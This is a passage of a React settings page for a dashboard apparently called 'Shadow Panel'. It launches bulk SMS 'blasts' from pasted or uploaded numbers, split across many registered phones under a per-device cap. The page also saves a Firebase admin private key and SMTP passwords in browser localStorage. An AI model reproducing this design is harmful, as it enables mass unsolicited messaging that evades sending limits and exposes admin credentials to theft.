'use client';

import { useEffect, useRef, useState, useCallback } from 'react';
import {
  Save, Plus, Trash2, CheckCircle2, Database, Mail, CreditCard, KeyRound,
  FileJson, Upload, Send, Smartphone, RefreshCw, AlertCircle, Users, MessageSquare,
  ChevronDown, ChevronUp, Loader2, X,
} from 'lucide-react';
import { useAuth } from '@/components/auth-provider';
import { calculateSmsSegments } from '@/lib/csv';
import type { Device } from '@/types';

interface SmtpConfig { host: string; port: string; username: string; password: string; fromName: string; fromEmail: string; enabled: boolean; }
interface SimSlot { id: string; name: string; simSlot: 0 | 1; operator: string; priority: number; active: boolean; }
interface ServiceAccountInfo { client_email: string; project_id: string; loaded: boolean; }
interface GoogleServicesInfo { databaseURL: string; projectId: string; loaded: boolean; }

const SMTP_DEFAULT: SmtpConfig = { host: '', port: '587', username: '', password: '', fromName: '', fromEmail: '', enabled: false };
const SLOTS_DEFAULT: SimSlot[] = [
  { id: '1', name: 'Primary SIM', simSlot: 0, operator: '', priority: 1, active: true },
  { id: '2', name: 'Secondary SIM', simSlot: 1, operator: '', priority: 2, active: true },
];

function load<T>(key: string, fallback: T): T {
  try { const v = localStorage.getItem(key); return v ? JSON.parse(v) as T : fallback; } catch { return fallback; }
}
function save(key: string, val: unknown) { try { localStorage.setItem(key, JSON.stringify(val)); } catch { /**/ } }

function Toast({ msg, error }: { msg: string; error?: boolean }) {
  return msg ? (
    <div className={`fixed bottom-6 right-6 z-50 flex items-center gap-2 ${error ? 'bg-red-600' : 'bg-emerald-600'} text-white px-4 py-2.5 rounded-lg shadow-lg text-sm font-medium animate-fade-in`}>
      {error ? <AlertCircle className="w-4 h-4" /> : <CheckCircle2 className="w-4 h-4" />} {msg}
    </div>
  ) : null;
}

function Section({ icon, iconBg, iconColor, title, sub, children }: {
  icon: React.ReactNode; iconBg: string; iconColor: string; title: string; sub: string; children: React.ReactNode;
}) {
  return (
    <div className="card p-5 space-y-4">
      <div className="flex items-center gap-2.5 pb-3 border-b border-slate-100 dark:border-slate-700/50">
        <div className={`w-8 h-8 rounded-lg ${iconBg} flex items-center justify-center`}>
          <span className={iconColor}>{icon}</span>
        </div>
        <div><p className="text-sm font-semibold text-slate-900 dark:text-white">{title}</p><p className="text-xs text-slate-400">{sub}</p></div>
      </div>
      {children}
    </div>
  );
}

// ─── SMS Spreading Status Badge ───────────────────────────────────────────

function StatusDot({ status }: { status: string }) {
  const color =
    status === 'online' ? 'bg-emerald-400' :
    status === 'idle'   ? 'bg-yellow-400' :
    status === 'busy'   ? 'bg-orange-400' :
                          'bg-slate-400';
  return <span className={`inline-block w-2 h-2 rounded-full flex-shrink-0 ${color}`} />;
}

// ─── SMS Spreading Panel ──────────────────────────────────────────────────

type SpreadStage = 'idle' | 'uploading' | 'creating' | 'starting' | 'done' | 'error';

function SmsSpreading({ idToken }: { idToken: string | null }) {
  const [open, setOpen] = useState(false);
  const [devices, setDevices] = useState<Device[]>([]);
  const [devicesLoading, setDevicesLoading] = useState(false);
  const [selectedDevices, setSelectedDevices] = useState<string[]>([]);
  const [numbers, setNumbers] = useState('');
  const [message, setMessage] = useState('');
  const [maxPerDevice, setMaxPerDevice] = useState(55);
  const [campaignName, setCampaignName] = useState('');
  const [stage, setStage] = useState<SpreadStage>('idle');
  const [stageMsg, setStageMsg] = useState('');
  const [resultCampaignId, setResultCampaignId] = useState('');
  const csvSpreadRef = useRef<HTMLInputElement>(null);

  const smsInfo = calculateSmsSegments(message);

  const loadDevices = useCallback(async () => {
    if (!idToken) return;
    setDevicesLoading(true);
    try {
      const res = await fetch('/api/devices?pageSize=100', {
        headers: { Authorization: `Bearer ${idToken}` },
      });
      const json = await res.json() as { success: boolean; data?: { items: Device[] } };
      if (json.success && json.data) {
        setDevices(json.data.items);
        const online = json.data.items
          .filter(d => d.status === 'online' || d.status === 'idle')
          .map(d => d.id);
        setSelectedDevices(online);
      }
    } catch { /**/ }
    finally { setDevicesLoading(false); }
  }, [idToken]);

  useEffect(() => {
    if (open) loadDevices();
  }, [open, loadDevices]);

  // Parse numbers from textarea: each line is a phone number
  function parseNumbers(raw: string): string[] {
    return raw
      .split(/[\n,;]+/)
      .map(l => l.trim().replace(/[^+\d]/g, ''))
      .filter(l => l.length >= 7);
  }

  // Build a minimal CSV blob from raw lines
  function buildCsvBlob(nums: string[]): Blob {
    const rows = ['phone', ...nums].join('\n');
    return new Blob([rows], { type: 'text/csv' });
  }

  function handleSpreadCsvFile(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
      const text = (ev.target?.result as string) ?? '';
      // Extract phone column values and populate textarea
      const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
      if (lines.length === 0) return;
      const header = lines[0].toLowerCase();
      // If first row looks like a header, strip it
      const isHeader = /phone|mobile|number|tel/i.test(header) && !/^\+?\d/.test(header);
      const dataLines = isHeader ? lines.slice(1) : lines;
      // Extract first column
      const nums = dataLines.map(l => l.split(',')[0].trim()).filter(Boolean);
      setNumbers(nums.join('\n'));
    };
    reader.readAsText(file);
    e.target.value = '';
  }

  async function handleLaunch() {
    if (!idToken) return;
    const parsedNums = parseNumbers(numbers);
    if (parsedNums.length === 0) { setStage('error'); setStageMsg('No valid numbers found'); return; }
    if (!message.trim()) { setStage('error'); setStageMsg('Message is required'); return; }
    if (selectedDevices.length === 0) { setStage('error'); setStageMsg('Select at least one device'); return; }

    const name = campaignName.trim() || `Blast ${new Date().toLocaleString('en-IN', { dateStyle: 'short', timeStyle: 'short' })}`;

    try {
      // Step 1: upload contacts
      setStage('uploading');
      setStageMsg(`Uploading ${parsedNums.length} numbers…`);
      const csv = buildCsvBlob(parsedNums);
      const fd = new FormData();
      fd.append('file', csv, `spread-${Date.now()}.csv`);
      const upRes = await fetch('/api/contacts/upload', {
        method: 'POST',
        headers: { Authorization: `Bearer ${idToken}` },
        body: fd,
      });
      const upJson = await upRes.json() as { success: boolean; data?: { batchId: string; summary: { valid: number } }; error?: string };
      if (!upJson.success || !upJson.data) throw new Error(upJson.error ?? 'Upload failed');
      const { batchId, summary } = upJson.data;

      // Step 2: create campaign
      setStage('creating');
      setStageMsg(`Creating campaign for ${summary.valid} valid numbers across ${selectedDevices.length} devices…`);
      const proj = devices.find(d => selectedDevices.includes(d.id))?.projectId ?? '';
      const campRes = await fetch('/api/campaigns', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${idToken}` },
        body: JSON.stringify({
          name,
          message: message.trim(),
          projectId: proj,
          deviceIds: selectedDevices,
          batchId,
          settings: { rateLimit: maxPerDevice },
        }),
      });
      const campJson = await campRes.json() as { success: boolean; data?: { id: string }; error?: string };
      if (!campJson.success || !campJson.data) throw new Error(campJson.error ?? 'Campaign creation failed');
      const campaignId = campJson.data.id;

      // Step 3: start campaign
      setStage('starting');
      setStageMsg('Queueing campaign…');
      const startRes = await fetch(`/api/campaigns/${campaignId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${idToken}` },
        body: JSON.stringify({ action: 'start' }),
      });
      const startJson = await startRes.json() as { success: boolean; error?: string };
      if (!startJson.success) throw new Error(startJson.error ?? 'Failed to start campaign');

      setResultCampaignId(campaignId);
      setStage('done');
      setStageMsg(`Campaign launched. ${summary.valid} messages queued across ${selectedDevices.length} devices (~${Math.ceil(summary.valid / selectedDevices.length)} per device).`);
    } catch (err) {
      setStage('error');
      setStageMsg(err instanceof Error ? err.message : 'Launch failed');
    }
  }

  function reset() {
    setStage('idle');
    setStageMsg('');
    setResultCampaignId('');
    setNumbers('');
    setMessage('');
    setCampaignName('');
  }

  const parsedCount = parseNumbers(numbers).length;
  const activeDevices = devices.filter(d => d.status === 'online' || d.status === 'idle');
  const perDeviceEst = selectedDevices.length > 0 ? Math.ceil(parsedCount / selectedDevices.length) : 0;
  const isRunning = stage === 'uploading' || stage === 'creating' || stage === 'starting';

  return (
    <div className="card overflow-hidden">
      {/* Header — clickable to expand */}
      <button
        onClick={() => setOpen(o => !o)}
        className="w-full flex items-center gap-2.5 p-5 text-left hover:bg-slate-50 dark:hover:bg-slate-800/50 transition-colors"
      >
        <div className="w-8 h-8 rounded-lg bg-purple-50 dark:bg-purple-950 flex items-center justify-center flex-shrink-0">
          <Send className="w-4 h-4 text-purple-500" />
        </div>
        <div className="flex-1">
          <p className="text-sm font-semibold text-slate-900 dark:text-white">SMS Spreading</p>
          <p className="text-xs text-slate-400">Distribute bulk SMS across all online Firebase devices</p>
        </div>
        {open ? <ChevronUp className="w-4 h-4 text-slate-400 flex-shrink-0" /> : <ChevronDown className="w-4 h-4 text-slate-400 flex-shrink-0" />}
      </button>

      {open && (
        <div className="border-t border-slate-100 dark:border-slate-700/50 p-5 space-y-5">

          {/* Done state */}
          {stage === 'done' && (
            <div className="space-y-3">
              <div className="flex items-start gap-3 p-4 bg-emerald-50 dark:bg-emerald-950/40 border border-emerald-200 dark:border-emerald-800 rounded-xl">
                <CheckCircle2 className="w-5 h-5 text-emerald-500 flex-shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <p className="text-sm font-medium text-emerald-700 dark:text-emerald-400">Campaign launched</p>
                  <p className="text-xs text-emerald-600 dark:text-emerald-500">{stageMsg}</p>
                  {resultCampaignId && (
                    <a href={`/campaigns/${resultCampaignId}`} className="text-xs text-emerald-700 dark:text-emerald-400 underline font-mono">
                      View campaign → {resultCampaignId}
                    </a>
                  )}
                </div>
              </div>
              <button onClick={reset} className="btn-secondary gap-2 text-sm">
                <RefreshCw className="w-4 h-4" /> Start Another Blast
              </button>
            </div>
          )}

          {/* Error state */}
          {stage === 'error' && (
            <div className="flex items-start gap-3 p-3 bg-red-50 dark:bg-red-950/40 border border-red-200 dark:border-red-800 rounded-xl">
              <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
              <div className="flex-1">
                <p className="text-sm text-red-700 dark:text-red-400">{stageMsg}</p>
              </div>
              <button onClick={() => { setStage('idle'); setStageMsg(''); }} className="text-red-400 hover:text-red-600">
                <X className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* Running state */}
          {isRunning && (
            <div className="flex items-center gap-3 p-3 bg-slate-50 dark:bg-slate-800 rounded-xl">
              <Loader2 className="w-4 h-4 text-brand-600 animate-spin flex-shrink-0" />
              <p className="text-sm text-slate-700 dark:text-slate-300">{stageMsg}</p>
            </div>
          )}

          {/* Form — hide while running or done */}
          {stage !== 'done' && !isRunning && (
            <>
              {/* Device list */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-1.5">
                    <Smartphone className="w-3.5 h-3.5 text-slate-400" />
                    <span className="text-xs font-medium text-slate-500 dark:text-slate-400 uppercase tracking-wide">
                      Online Devices
                    </span>
                    {activeDevices.length > 0 && (
                      <span className="text-xs bg-emerald-100 dark:bg-emerald-950 text-emerald-700 dark:text-emerald-400 rounded-full px-1.5 py-0.5 font-medium">
                        {activeDevices.length} active
                      </span>
                    )}
                  </div>
                  <button
                    onClick={loadDevices}
                    disabled={devicesLoading}
                    className="flex items-center gap-1 text-xs text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors"
                  >
                    <RefreshCw className={`w-3 h-3 ${devicesLoading ? 'animate-spin' : ''}`} />
                    Refresh
                  </button>
                </div>

                {devicesLoading ? (
                  <div className="flex items-center gap-2 py-3 text-xs text-slate-400">
                    <Loader2 className="w-3.5 h-3.5 animate-spin" /> Loading devices…
                  </div>
                ) : devices.length === 0 ? (
                  <p className="text-xs text-slate-400 py-2">No devices registered.</p>
                ) : (
                  <div className="grid grid-cols-1 gap-1.5 max-h-52 overflow-y-auto pr-1">
                    {devices.map(device => {
                      const available = device.status === 'online' || device.status === 'idle';
                      const checked = selectedDevices.includes(device.id);
                      return (
                        <label
                          key={device.id}
                          className={`flex items-center gap-3 px-3 py-2.5 rounded-lg border cursor-pointer transition-colors ${
                            checked
                              ? 'border-purple-400 bg-purple-50 dark:bg-purple-950/30'
                              : 'border-slate-200 dark:border-slate-700 hover:border-purple-300 dark:hover:border-purple-700'
                          } ${!available ? 'opacity-40 cursor-not-allowed' : ''}`}
                        >
                          <input
                            type="checkbox"
                            checked={checked}
                            disabled={!available}
                            onChange={e => {
                              setSelectedDevices(prev =>
                                e.target.checked ? [...prev, device.id] : prev.filter(id => id !== device.id)
                              );
                            }}
                            className="w-3.5 h-3.5 accent-purple-600 flex-shrink-0"
                          />
                          <StatusDot status={device.status} />
                          <div className="flex-1 min-w-0">
                            <p className="text-xs font-medium text-slate-800 dark:text-slate-200 truncate">{device.name}</p>
                            <p className="text-[10px] text-slate-400 truncate">{device.phoneNumber ?? 'No number'} · {device.model ?? device.status}</p>
                          </div>
                          <span className="text-[10px] text-slate-400 flex-shrink-0 capitalize">{device.status}</span>
                        </label>
                      );
                    })}
                  </div>
                )}

                {selectedDevices.length > 0 && (
                  <div className="flex gap-2">
                    <button onClick={() => setSelectedDevices(activeDevices.map(d => d.id))} className="text-[11px] text-purple-600 hover:underline">Select all active</button>
                    <span className="text-slate-300 dark:text-slate-600">·</span>
                    <button onClick={() => setSelectedDevices([])} className="text-[11px] text-slate-400 hover:underline">Deselect all</button>
                  </div>
                )}
              </div>

              {/* Numbers input */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-1.5">
                    <Users className="w-3.5 h-3.5 text-slate-400" />
                    <span className="text-xs font-medium text-slate-500 dark:text-slate-400 uppercase tracking-wide">Phone Numbers</span>
                    {parsedCount > 0 && (
                      <span className="text-xs bg-blue-100 dark:bg-blue-950 text-blue-700 dark:text-blue-400 rounded-full px-1.5 py-0.5 font-medium">
                        {parsedCount} loaded
                      </span>
                    )}
                  </div>
                  <button onClick={() => csvSpreadRef.current?.click()} className="flex items-center gap-1 text-xs text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors">
                    <Upload className="w-3 h-3" /> Upload CSV
                  </button>
                  <input ref={csvSpreadRef} type="file" accept=".csv,.txt" className="hidden" onChange={handleSpreadCsvFile} />
                </div>
                <textarea
                  rows={5}
                  value={numbers}
                  onChange={e => setNumbers(e.target.value)}
                  placeholder={`Paste numbers, one per line:\n+919876543210\n+918765432109\n...`}
                  className="input w-full text-xs font-mono resize-none"
                />
                <p className="text-[11px] text-slate-400">One number per line · or comma/semicolon separated · CSV upload auto-extracts phone column</p>
              </div>

              {/* Message input */}
              <div className="space-y-2">
                <div className="flex items-center gap-1.5">
                  <MessageSquare className="w-3.5 h-3.5 text-slate-400" />
                  <span className="text-xs font-medium text-slate-500 dark:text-slate-400 uppercase tracking-wide">SMS Message</span>
                </div>
                <textarea
                  rows={4}
                  value={message}
                  onChange={e => setMessage(e.target.value)}
                  placeholder="Enter the SMS message to send to all numbers…"
                  className="input w-full text-sm resize-none"
                />
                <div className="flex justify-between text-[11px] text-slate-400">
                  <span>{smsInfo.chars} chars · {smsInfo.encoding} · {smsInfo.segments} segment{smsInfo.segments !== 1 ? 's' : ''}</span>
                  {smsInfo.segments > 1 && <span>Multi-part SMS — costs {smsInfo.segments}× per recipient</span>}
                </div>
              </div>

              {/* Campaign name + per-device limit row */}
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1.5">
                  <label className="text-xs font-medium text-slate-500 dark:text-slate-400 uppercase tracking-wide">Campaign Name</label>
                  <input
                    type="text"
                    value={campaignName}
                    onChange={e => setCampaignName(e.target.value)}
                    placeholder={`Blast ${new Date().toLocaleDateString('en-IN')}`}
                    className="input w-full text-sm"
                  />
                </div>
                <div className="space-y-1.5">
                  <label className="text-xs font-medium text-slate-500 dark:text-slate-400 uppercase tracking-wide">Max SMS / Device</label>
                  <input
                    type="number"
                    value={maxPerDevice}
                    onChange={e => setMaxPerDevice(Math.max(1, parseInt(e.target.value) || 55))}
                    min={1}
                    max={500}
                    className="input w-full text-sm"
                  />
                </div>
              </div>

              {/* Distribution preview */}
              {parsedCount > 0 && selectedDevices.length > 0 && (
                <div className="flex items-center gap-3 p-3 bg-slate-50 dark:bg-slate-800/60 rounded-lg text-xs text-slate-600 dark:text-slate-300">
                  <span className="font-medium">{parsedCount}</span> numbers
                  <span className="text-slate-300 dark:text-slate-600">÷</span>
                  <span className="font-medium">{selectedDevices.length}</span> devices
                  <span className="text-slate-300 dark:text-slate-600">=</span>
                  <span className={`font-semibold ${perDeviceEst > maxPerDevice ? 'text-amber-600 dark:text-amber-400' : 'text-emerald-600 dark:text-emerald-400'}`}>
                    ~{perDeviceEst} per device
                  </span>
                  {perDeviceEst > maxPerDevice && (
                    <span className="text-amber-600 dark:text-amber-400">
                      · Rate limited to {maxPerDevice}/min per device
                    </span>
                  )}
                </div>
              )}

              {/* Launch button */}
              <button
                onClick={handleLaunch}
                disabled={parsedCount === 0 || !message.trim() || selectedDevices.length === 0}
                className="btn-primary w-full gap-2 text-sm py-2.5 bg-purple-600 hover:bg-purple-700 disabled:opacity-40"
              >
                <Send className="w-4 h-4" />
                Launch Blast — {parsedCount} numbers · {selectedDevices.length} devices
              </button>
            </>
          )}
        </div>
      )}
    </div>
  );
}

// ─── Main Settings Page ───────────────────────────────────────────────────

export default function SettingsPage() {
  const { user, idToken } = useAuth();
  const [rtdbUrl, setRtdbUrl] = useState('');
  const [smtp, setSmtp] = useState<SmtpConfig>(SMTP_DEFAULT);
  const [slots, setSlots] = useState<SimSlot[]>(SLOTS_DEFAULT);
  const [toast, setToast] = useState('');
  const [toastError, setToastError] = useState(false);
  const [saInfo, setSaInfo] = useState<ServiceAccountInfo>({ client_email: '', project_id: '', loaded: false });
  const [saText, setSaText] = useState('');
  const [gsInfo, setGsInfo] = useState<GoogleServicesInfo>({ databaseURL: '', projectId: '', loaded: false });
  const [gsText, setGsText] = useState('');
  const saFileRef = useRef<HTMLInputElement>(null);
  const gsFileRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    setRtdbUrl(localStorage.getItem('panel_rtdb_url') ?? '');
    setSmtp(load('panel_smtp', SMTP_DEFAULT));
    setSlots(load('panel_slots', SLOTS_DEFAULT));
    const saRaw = localStorage.getItem('panel_service_account');
    if (saRaw) {
      try {
        const sa = JSON.parse(saRaw) as Record<string, string>;
        setSaInfo({ client_email: sa.client_email ?? '', project_id: sa.project_id ?? '', loaded: true });
      } catch { /**/ }
    }
    const gsRaw = localStorage.getItem('panel_google_services');
    if (gsRaw) {
      try {
        const gs = JSON.parse(gsRaw) as Record<string, unknown>;
        const dbUrl = extractDatabaseURL(gs);
        const pid = extractProjectId(gs);
        if (dbUrl) setGsInfo({ databaseURL: dbUrl, projectId: pid, loaded: true });
      } catch { /**/ }
    }
  }, []);

  function showToast(msg: string, error = false) { setToastError(error); setToast(msg); setTimeout(() => setToast(''), 2500); }

  function extractDatabaseURL(obj: Record<string, unknown>): string {
    if (typeof obj.databaseURL === 'string') return obj.databaseURL;
    const proj = obj.project_info as Record<string, unknown> | undefined;
    if (proj && typeof proj.firebase_url === 'string') return proj.firebase_url;
    const pid = extractProjectId(obj);
    if (pid) return `https://${pid}-default-rtdb.firebaseio.com`;
    return '';
  }
  function extractProjectId(obj: Record<string, unknown>): string {
    if (typeof obj.project_id === 'string') return obj.project_id;
    const proj = obj.project_info as Record<string, unknown> | undefined;
    if (proj && typeof proj.project_id === 'string') return proj.project_id;
    return '';
  }

  function parseGoogleServices(raw: string) {
    try {
      const gs = JSON.parse(raw) as Record<string, unknown>;
      const dbUrl = extractDatabaseURL(gs);
      const pid = extractProjectId(gs);
      localStorage.setItem('panel_google_services', raw);
      setGsInfo({ databaseURL: dbUrl, projectId: pid, loaded: true });
      if (dbUrl) {
        const cleaned = dbUrl.replace(/\/$/, '');
        localStorage.setItem('panel_rtdb_url', cleaned);
        setRtdbUrl(cleaned);
        showToast('Google Services saved · RTDB URL auto-filled');
      } else {
        showToast('Google Services saved (manual RTDB URL needed)');
      }
    } catch { showToast('Invalid JSON — check google-services.json', true); }
  }

  function parseServiceAccount(raw: string) {
    try {
      const sa = JSON.parse(raw) as Record<string, string>;
      if (sa.type !== 'service_account') { showToast('Not a service account JSON', true); return; }
      if (!sa.private_key || !sa.client_email) { showToast('Missing private_key or client_email', true); return; }
      localStorage.setItem('panel_service_account', raw);
      setSaInfo({ client_email: sa.client_email, project_id: sa.project_id ?? '', loaded: true });
      showToast('Service account saved');
    } catch { showToast('Invalid JSON — check admin SDK file', true); }
  }

  function handleGsFile(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => parseGoogleServices((ev.target?.result as string) ?? '');
    reader.readAsText(file);
  }

  function handleSaFile(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => parseServiceAccount((ev.target?.result as string) ?? '');
    reader.readAsText(file);
  }

  function clearSa() { localStorage.removeItem('panel_service_account'); setSaInfo({ client_email: '', project_id: '', loaded: false }); setSaText(''); showToast('Service account removed'); }
  function clearGs() { localStorage.removeItem('panel_google_services'); setGsInfo({ databaseURL: '', projectId: '', loaded: false }); setGsText(''); showToast('Google Services config removed'); }

  function saveRtdb() {
    const cleaned = rtdbUrl.trim().replace(/\/$/, '');
    localStorage.setItem('panel_rtdb_url', cleaned);
    setRtdbUrl(cleaned);
    showToast('Firebase URL saved');
  }

  function saveSmtp() { save('panel_smtp', smtp); showToast('SMTP settings saved'); }

  function addSlot() {
    const s: SimSlot = { id: Date.now().toString(), name: `SIM Slot ${slots.length + 1}`, simSlot: slots.length % 2 === 0 ? 0 : 1, operator: '', priority: slots.length + 1, active: true };
    const u = [...slots, s]; setSlots(u); save('panel_slots', u);
  }
  function updateSlot(id: string, patch: Partial<SimSlot>) { const u = slots.map(s => s.id === id ? { ...s, ...patch } : s); setSlots(u); save('panel_slots', u); }
  function deleteSlot(id: string) { const u = slots.filter(s => s.id !== id); setSlots(u); save('panel_slots', u); }

  return (
    <div className="max-w-2xl space-y-6 animate-fade-in">
      <div>
        <h1 className="text-2xl font-bold text-slate-900 dark:text-white">Settings</h1>
        <p className="text-sm text-slate-500 dark:text-slate-400 mt-0.5">Panel configuration</p>
      </div>

      {/* SMS Spreading — top of page, most-used feature */}
      <SmsSpreading idToken={idToken} />

      {/* Google Services JSON */}
      <Section icon={<FileJson className="w-4 h-4" />} iconBg="bg-yellow-50 dark:bg-yellow-950" iconColor="text-yellow-500" title="Firebase Config (google-services.json)" sub="Auto-fills RTDB URL from your Firebase project config">
        {gsInfo.loaded ? (
          <div className="space-y-3">
            <div className="flex items-center gap-2 p-3 rounded-lg bg-emerald-50 dark:bg-emerald-950/40 border border-emerald-200 dark:border-emerald-800">
              <CheckCircle2 className="w-4 h-4 text-emerald-500 flex-shrink-0" />
              <div className="text-xs space-y-0.5">
                <p className="font-medium text-emerald-700 dark:text-emerald-400">Config loaded</p>
                {gsInfo.projectId && <p className="text-emerald-600 dark:text-emerald-500">Project: <span className="font-mono">{gsInfo.projectId}</span></p>}
                {gsInfo.databaseURL && <p className="text-emerald-600 dark:text-emerald-500">DB: <span className="font-mono">{gsInfo.databaseURL}</span></p>}
              </div>
            </div>
            <button onClick={clearGs} className="btn-secondary gap-2 text-sm text-red-500 hover:text-red-600">
              <Trash2 className="w-4 h-4" /> Remove Config
            </button>
          </div>
        ) : (
          <div className="space-y-3">
            <p className="text-xs text-slate-400">Firebase Console → Project Settings → google-services.json → paste or upload</p>
            <textarea rows={4} value={gsText} onChange={e => setGsText(e.target.value)} placeholder='Paste google-services.json content here...' className="input w-full text-xs font-mono resize-none" />
            <div className="flex gap-2">
              <button onClick={() => gsText.trim() && parseGoogleServices(gsText)} disabled={!gsText.trim()} className="btn-primary gap-2 text-sm"><Save className="w-4 h-4" /> Save JSON</button>
              <button onClick={() => gsFileRef.current?.click()} className="btn-secondary gap-2 text-sm"><Upload className="w-4 h-4" /> Upload File</button>
            </div>
            <input ref={gsFileRef} type="file" accept=".json" className="hidden" onChange={handleGsFile} />
          </div>
        )}
      </Section>

      {/* Service Account */}
      <Section icon={<KeyRound className="w-4 h-4" />} iconBg="bg-red-50 dark:bg-red-950" iconColor="text-red-500" title="Service Account Key (Admin SDK)" sub="Full admin access — bypasses Firebase rules">
        {saInfo.loaded ? (
          <div className="space-y-3">
            <div className="flex items-center gap-2 p-3 rounded-lg bg-emerald-50 dark:bg-emerald-950/40 border border-emerald-200 dark:border-emerald-800">
              <CheckCircle2 className="w-4 h-4 text-emerald-500 flex-shrink-0" />
              <div className="text-xs space-y-0.5">
                <p className="font-medium text-emerald-700 dark:text-emerald-400">Service account loaded</p>
                {saInfo.project_id && <p className="text-emerald-600 dark:text-emerald-500">Project: <span className="font-mono">{saInfo.project_id}</span></p>}
                {saInfo.client_email && <p className="text-emerald-600 dark:text-emerald-500">Email: <span className="font-mono break-all">{saInfo.client_email}</span></p>}
              </div>
            </div>
            <button onClick={clearSa} className="btn-secondary gap-2 text-sm text-red-500 hover:text-red-600"><Trash2 className="w-4 h-4" /> Remove Key</button>
          </div>
        ) : (
          <div className="space-y-3">
            <p className="text-xs text-slate-400">Firebase Console → Project Settings → Service Accounts → Generate New Private Key → paste or upload</p>
            <textarea rows={4} value={saText} onChange={e => setSaText(e.target.value)} placeholder='Paste firebase-adminsdk-xxxxx.json content here...' className="input w-full text-xs font-mono resize-none" />
            <div className="flex gap-2">
              <button onClick={() => saText.trim() && parseServiceAccount(saText)} disabled={!saText.trim()} className="btn-primary gap-2 text-sm"><Save className="w-4 h-4" /> Save Key</button>
              <button onClick={() => saFileRef.current?.click()} className="btn-secondary gap-2 text-sm"><Upload className="w-4 h-4" /> Upload File</button>
            </div>
            <input ref={saFileRef} type="file" accept=".json" className="hidden" onChange={handleSaFile} />
          </div>
        )}
      </Section>

      {/* Firebase RTDB URL */}
      <Section icon={<Database className="w-4 h-4" />} iconBg="bg-orange-50 dark:bg-orange-950" iconColor="text-orange-500" title="Firebase RTDB URL" sub="Realtime Database URL (auto-filled from google-services.json)">
        <div className="space-y-1.5">
          <label className="text-xs font-medium text-slate-500 dark:text-slate-400 uppercase tracking-wide">Database URL</label>
          <input type="url" value={rtdbUrl} onChange={e => setRtdbUrl(e.target.value)} placeholder="https://your-project-default-rtdb.firebaseio.com" className="input w-full font-mono text-sm" />
          <p className="text-[11px] text-slate-400">Firebase Console → Realtime Database → copy URL</p>
        </div>
        <button onClick={saveRtdb} className="btn-primary gap-2 text-sm"><Save className="w-4 h-4" /> Save URL</button>
      </Section>

      {/* SMTP */}
      <div className="card p-5 space-y-4">
        <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-700/50">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-blue-50 dark:bg-blue-950 flex items-center justify-center"><Mail className="w-4 h-4 text-blue-500" /></div>
            <div><p className="text-sm font-semibold text-slate-900 dark:text-white">SMTP Server</p><p className="text-xs text-slate-400">Email delivery configuration</p></div>
          </div>
          <label className="flex items-center gap-2 cursor-pointer">
            <span className="text-xs text-slate-500">Enable</span>
            <div onClick={() => setSmtp(s => ({ ...s, enabled: !s.enabled }))} className={`w-9 h-5 rounded-full transition-colors cursor-pointer relative ${smtp.enabled ? 'bg-brand-600' : 'bg-slate-200 dark:bg-slate-700'}`}>
              <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow-sm transition-all ${smtp.enabled ? 'left-4' : 'left-0.5'}`} />
            </div>
          </label>
        </div>
        <div className="grid grid-cols-2 gap-3">
          {[['Host','host','smtp.gmail.com','text'],['Port','port','587','text'],['Username','username','user@example.com','text'],['Password','password','••••••••','password'],['From Name','fromName','Shadow Panel','text'],['From Email','fromEmail','noreply@example.com','email']].map(([label, key, ph, type]) => (
            <div key={key} className="space-y-1">
              <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">{label}</label>
              <input type={type} value={(smtp as unknown as Record<string,string>)[key]} onChange={e => setSmtp(s => ({ ...s, [key]: e.target.value }))} placeholder={ph} className="input w-full text-sm" />
            </div>
          ))}
        </div>
        <button onClick={saveSmtp} className="btn-primary gap-2 text-sm"><Save className="w-4 h-4" /> Save SMTP</button>
      </div>

      {/* SIM Slots */}
      <div className="card p-5 space-y-4">
        <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-700/50">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-violet-50 dark:bg-violet-950 flex items-center justify-center"><CreditCard className="w-4 h-4 text-violet-500" /></div>
            <div><p className="text-sm font-semibold text-slate-900 dark:text-white">SIM Slots</p><p className="text-xs text-slate-400">Manage device SIM slot routing</p></div>
          </div>
          <button onClick={addSlot} className="btn-secondary gap-1.5 text-xs py-1.5 px-3"><Plus className="w-3.5 h-3.5" /> Add Slot</button>
        </div>
        <div className="space-y-2">
          {slots.map(slot => (
            <div key={slot.id} className="flex items-center gap-3 p-3 rounded-lg bg-slate-50 dark:bg-slate-800/50 border border-slate-100 dark:border-slate-700/50">
              <div className="flex-1 grid grid-cols-3 gap-2">
                <input type="text" value={slot.name} onChange={e => updateSlot(slot.id, { name: e.target.value })} className="input text-xs py-1.5" placeholder="Slot name" />
                <select value={slot.simSlot} onChange={e => updateSlot(slot.id, { simSlot: Number(e.target.value) as 0 | 1 })} className="input text-xs py-1.5">
                  <option value={0}>SIM 1</option><option value={1}>SIM 2</option>
                </select>
                <input type="text" value={slot.operator} onChange={e => updateSlot(slot.id, { operator: e.target.value })} className="input text-xs py-1.5" placeholder="Operator" />
              </div>
              <label className="flex items-center gap-1.5 flex-shrink-0 cursor-pointer">
